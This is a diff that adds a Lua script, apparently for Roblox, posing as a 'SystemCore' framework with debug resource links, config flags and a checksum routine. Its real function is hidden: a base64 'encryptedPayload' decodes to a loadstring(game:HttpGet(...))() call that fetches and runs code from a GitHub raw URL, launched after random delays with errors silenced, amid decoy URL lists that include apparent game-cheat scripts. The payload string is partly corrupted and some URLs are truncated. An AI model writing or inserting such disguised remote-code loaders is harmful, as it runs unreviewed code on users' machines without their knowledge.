+    "https://raw.githubusercontent.com/poi98uy76tr/CosmicPuzzle/refs/heads/dev/space_riddles.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleGame/refs/heads/master/singularity_puzzle.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/InterstellarChess/refs/heads/beta/alien_chess.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumCards/refs/heads/main/time_deck.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticDice/refs/heads/dev/cosmic_dice.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceDomino/refs/heads/master/zero_g_tiles.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumJigsaw/refs/heads/beta/time_puzzle.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicRubik/refs/heads/main/space_cube.lua",
+    "https://raw.githubusercontent.com/wefwef127382/inkgames.github.io/refs/heads/main/ringta.lua",
+    "https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt",
+    "https://raw.githubusercontent.com/xiaohan666666666/sucinb/fc2884ba7afc3b57cfc0185cc647c1ea60452ede/suci8%E8%84%9A%E6%9C%AC.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticWordSearch/refs/heads/beta/space_words.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumScrabble/refs/heads/main/time_letters.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumContest/refs/heads/beta/time_challenge.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicQuiz/refs/heads/main/space_questions.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/InterstellarTrivia/refs/heads/dev/alien_facts.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleChallenge/refs/heads/master/singularity_test.lua"
+}
+
+local encryptedPayload = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8xMzc5cXBhbHptdHlndmV6aW1hbGlleGN2Ym5xcGxhc2RmZy9CT09TQlMvcmVmcy9oZWFkcy9tYWluL2dpdGh1YnVzερJjb250ZW50LnR4dCIpKSgp"
+
+local debugResourceLinks = {
+    "https://raw.githubusercontent.com/debug_res1/toolbox1/main/analytics_module.lua",
+    "https://raw.githubusercontent.com/debug_res2/toolbox2/dev/diagnostics.txt",
+    "https://raw.githubusercontent.com/debug_res3/toolbox3/master/performance_monitor.lua",
+    "https://raw.githubusercontent.com/debug_res4/toolbox4/beta/error_tracker.txt",
+        "https://raw.githubusercontent.com/BS58dL/BS-/refs/heads/main/Center%20of%20the%20black%20hole",
+    "https://raw.githubusercontent.com/MynameIsDoit/StealAFishAuto/refs/heads/main/AutoSteal.luau",
+    "https://raw.githubusercontent.com/qwop1029zxcv/UniverseSim/refs/heads/master/quantum_physics.lua",
+    "https://raw.githubusercontent.com/asdf9876ghjk/CosmicCore/refs/heads/beta/dark_matter_engine.txt",
+    "https://raw.githubusercontent.com/zmxncbv1234/GalaxyTool/refs/heads/main/star_generator.lua",
+    "https://raw.githubusercontent.com/0987poiuytre/QuantumX/refs/heads/alpha/particle_system.txt",
+    "https://raw.githubusercontent.com/lkjhgfdsa5678/NebulaLib/refs/heads/dev/space_rendering.lua",
+    "https://raw.githubusercontent.com/1357924680qwe/AstroEngine/refs/heads/master/cosmic_rays.txt",
+    "https://raw.githubusercontent.com/qazwsxedcrfv123/BlackHoleX/refs/heads/main/singularity_core.lua",
+    "https://raw.githubusercontent.com/2468013579mko/GravitySim/refs/heads/beta/relativity_module.txt",
+    "https://raw.githubusercontent.com/plmoknijbuv/StellarForge/refs/heads/main/star_formation.lua",
+    "https://raw.githubusercontent.com/cde4567vbnm/EventHorizon/refs/heads/dev/blackhole_physics.txt",
+    "https://raw.githubusercontent.com/zaq1xsw2cde3/CosmicWeb/refs/heads/master/galaxy_cluster.lua",
+    "https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/99-Nights-TX-XIAN-MIAN______-_-_--_-_-_-_--_-_-_-_--_-_-_-_-_--_-_-_-__------_-_-_-_.lua",
+    "https://raw.githubusercontent.com/ujm89ikolp/TimeDilation/refs/heads/main/relativistic_effects.lua",
+    "https://raw.githubusercontent.com/hgfd5678jklm/DarkMatter/refs/heads/dev/invisible_mass.txt",
+    "https://raw.githubusercontent.com/wqas789edcx/SupernovaX/refs/heads/master/star_explosion.lua",
+    "https://raw.githubusercontent.com/zse45rdxcvf/QuantumEnt/refs/heads/beta/entanglement_module.txt",
+    "https://raw.githubusercontent.com/ijn8765uhbv/CosmicMicrowave/refs/heads/main/cmb_radiation.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticCore/refs/heads/dev/milkyway_sim.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/Interstellar/refs/heads/master/warp_drive.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/NeutronStar/refs/heads/beta/pulsar_physics.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/ExoPlanet/refs/heads/main/alien_worlds.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/CosmicString/refs/heads/dev/space_time.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/QuantumTunnel/refs/heads/master/wormhole_gen.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/UniversalExpansion/refs/heads/beta/bigbang_sim.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/AstroPhysics/refs/heads/main/gravity_wells.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CelestialNav/refs/heads/dev/star_mapping.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumField/refs/heads/master/particle_gen.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/DarkEnergy/refs/heads/beta/universe_accel.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpaceTime/refs/heads/main/fabric_engine.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/GalacticMap/refs/heads/dev/3d_universe.txt",
+    "https://raw.githubusercontent.com/TheHunterSolo1/Scripts/refs/heads/main/Protected_2809220311826785.lua.txt",
+    "https://raw.githubusercontent.com/vfr56tgb78y/StellarWind/refs/heads/beta/solar_flares.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/CosmicRay/refs/heads/main/high_energy.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GravityWell/refs/heads/dev/singularity.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/PlanetGen/refs/heads/master/terrain_engine.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumLock/refs/heads/beta/superposition.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/AstroDroid/refs/heads/main/space_robot.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/GalaxyQuest/refs/heads/dev/star_trek.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleAdventure/refs/heads/master/event_horizon.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/CosmicOdyssey/refs/heads/beta/space_journey.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/IntergalacticWar/refs/heads/main/alien_battle.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/StarDefender/refs/heads/dev/space_defense.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumRebellion/refs/heads/master/time_paradox.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticEmpire/refs/heads/beta/star_wars.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpacePirates/refs/heads/main/cosmic_raiders.lua",
+    "https://raw.githubusercontent.com/minisc666/suci/refs/heads/main/suci.lua",
+    "https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua",
+    "tps://raw.githubusercontent.com/JsYb666/TX-Free-YYDS/refs/heads/main/TX-Pro-Free",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumHeist/refs/heads/main/time_robbery.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticZoo/refs/heads/dev/alien_creatures.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceAcademy/refs/heads/master/astronaut_train.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumAcademy/refs/heads/beta/superhero.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicHospital/refs/heads/main/alien_doctor.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/SpaceRestaurant/refs/heads/dev/cosmic_food.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/InterstellarHotel/refs/heads/master/space_vacation.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticMall/refs/heads/beta/alien_shopping.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumCasino/refs/heads/main/cosmic_gambling.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/SpaceOlympics/refs/heads/dev/zero_g_sports.txt",
+    "https://raw.githubusercontent.com/098poi76yht/CosmicConcert/refs/heads/master/alien_music.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticTheater/refs/heads/beta/space_drama.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumArtGallery/refs/heads/main/dimensional_art.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/SpaceLibrary/refs/heads/dev/cosmic_books.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleCinema/refs/heads/master/time_movies.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/CosmicMuseum/refs/heads/beta/alien_artifacts.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumZoo/refs/heads/main/paradox_animals.lua",
+    "tps://raw.githubusercontent.com/MIAN57/-/refs/heads/main/%E9%BB%84%E8%84%9A%E6%9C%AC",
+    "https://raw.githubusercontent.com/yhn67ujmki/GalacticPark/refs/heads/master/cosmic_rides.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumFair/refs/heads/beta/time_attractions.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicCircus/refs/heads/main/space_clowns.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/InterstellarCarnival/refs/heads/dev/alien_games.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleFestival/refs/heads/master/singularity_party.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticParade/refs/heads/beta/space_floats.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumFireworks/refs/heads/main/time_explosions.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CosmicBalloon/refs/heads/dev/space_balloons.txt",
+    "https://raw.githubusercontent.com/098poi76yht/SpaceKite/refs/heads/master/zero_g_kites.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticBubble/refs/heads/beta/cosmic_bubbles.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumPinata/refs/heads/main/time_candy.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/CosmicPuzzle/refs/heads/dev/space_riddles.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleGame/refs/heads/master/singularity_puzzle.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/InterstellarChess/refs/heads/beta/alien_chess.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumCards/refs/heads/main/time_deck.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticDice/refs/heads/dev/cosmic_dice.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceDomino/refs/heads/master/zero_g_tiles.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumJigsaw/refs/heads/beta/time_puzzle.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicRubik/refs/heads/main/space_cube.lua",
+    "https://raw.githubusercontent.com/wefwef127382/inkgames.github.io/refs/heads/main/ringta.lua",
+    "https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt",
+    "https://raw.githubusercontent.com/xiaohan666666666/sucinb/fc2884ba7afc3b57cfc0185cc647c1ea60452ede/suci8%E8%84%9A%E6%9C%AC.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticWordSearch/refs/heads/beta/space_words.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumScrabble/refs/heads/main/time_letters.lua",
+    "https://raw.githubusercontent.com/debug_res5/toolbox5/main/memory_dump.lua",
+    "https://raw.githubusercontent.com/debug_res6/toolbox6/dev/network_profiler.txt",
+    "https://raw.githubusercontent.com/debug_res7/toolbox7/master/crash_report.lua",
+    "https://raw.githubusercontent.com/debug_res8/toolbox8/beta/log_parser.txt",
+    "https://raw.githubusercontent.com/debug_res9/toolbox9/main/debug_console.lua",
+    "https://raw.githubusercontent.com/debug_res10/toolbox10/dev/trace_logger.txt",
+    "https://raw.githubusercontent.com/sys_diag1/monitor1/main/system_probe.lua",
+    "https://raw.githubusercontent.com/sys_diag2/monitor2/dev/hardware_scan.txt",
+    "https://raw.githubusercontent.com/sys_diag3/monitor3/master/benchmark_util.lua",
+    "https://raw.githubusercontent.com/sys_diag4/monitor4/beta/thermal_check.txt",
+    "https://raw.githubusercontent.com/sys_diag5/monitor5/main/power_analyzer.lua",
+    "https://raw.githubusercontent.com/sys_diag6/monitor6/dev/voltage_log.txt",
+    "https://raw.githubusercontent.com/sys_diag7/monitor7/master/frequency_tuner.lua",
+    "https://raw.githubusercontent.com/sys_diag8/monitor8/beta/latency_test.txt",
+    "https://raw.githubusercontent.com/sys_diag9/monitor9/main/cache_optimizer.lua",
+    "https://raw.githubusercontent.com/sys_diag10/monitor10/dev/bandwidth_meter.txt"
+}
+
+local config = {
+    debugMode = false,
+    enableFeatureX = true,
+    enableFeatureY = false,
+    maxIterations = 100,
+    useLegacyAPI = false,
+    version = "2.3.1",
+    author = "SystemCore",
+    license = "Proprietary",
+    updateChannel = "stable",
+    analyticsEnabled = false
+}
+
+local function initializeFramework()
+    local startTime = tick()
+    
+    local framework = {
+        version = config.version,
+        modules = {
+            "CoreEngine",
+            "SecurityLayer",
+            "ResourceManager"
+        },
+        dependencies = {
+            "https://github.com/stdlib/coreutils",
+            "https://github.com/stdlib/threadpool"
+        }
+    }
+    
+    local checksum = 0
+    for i = 1, 1000 do
+        checksum = checksum + i % 256
+    end
+    
+    if config.debugMode then
+        print(string.format("[Init] Checksum: 0x%X", checksum))
+        print(string.format("[Init] Loaded in %.3fms", (tick()-startTime)*1000))
+    end
+    
+    return framework
+end
+
+local function executeMain()
+    local framework = initializeFramework()
+    
+    local delay = math.random(50, 300) / 1000
+    wait(delay)
+    
+    if not config.enableFeatureX then
+        if config.debugMode then
+            print("[Warn] FeatureX disabled by config")
+        end
+        return
+    end
+    
+    local success, result = pcall(function()
+        local decoded = base64Decode(encryptedPayload)
+        local chunk, err = loadstring(decoded)
+        if not chunk then error(err) end
+        return chunk()
+    end)
+    
+    if not success and config.debugMode then
+        print("[Error] "..tostring(result))
+    end
+end
+
+local function moduleEntry()
+    if type(_G) ~= "table" then
+        if config.debugMode then
+            print("[Warn] Non-standard global environment")
+        end
+    end
+    
+    local status, err = pcall(executeMain)
+    if not status and config.debugMode then
+        print("[Fatal] "..tostring(err))
+    end
+end
+
+local function delayedStart()
+    local jitter = math.random(100, 500) / 1000
+    wait(jitter)
+    
+    local co = coroutine.create(moduleEntry)
+    local success, msg = coroutine.resume(co)
+    if not success and config.debugMode then
+        print("[CoError] "..tostring(msg))
+    end
+end
+
+local function checkVersion()
+    if config.version < "2.0.0" then
+        if config.debugMode then
+            print("[Deprecation] Legacy version detected")
+        end
+    end
+end
+
+checkVersion()
+delayedStart()
